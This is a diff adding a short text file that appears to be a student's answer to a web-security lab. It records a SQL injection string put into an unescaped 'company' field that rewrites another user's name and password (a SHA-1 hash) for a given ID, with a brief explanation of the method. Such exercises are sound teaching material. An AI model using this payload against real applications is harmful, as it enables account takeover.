@@ -1,0 +1,6 @@
+"yo"
+alice
+"company" = "Maryland',name='bob',pass='c41975d1dae1cc69b16ad8892b8c77164e84ca39' WHERE ID = 3 -- "
+ 
+The company one was the only field that wasn't escaped and then I injected SQL to changed the password to "yo" which has been hashed by sha1 
+I also found bob'd ID via the Collaborative's SQL table
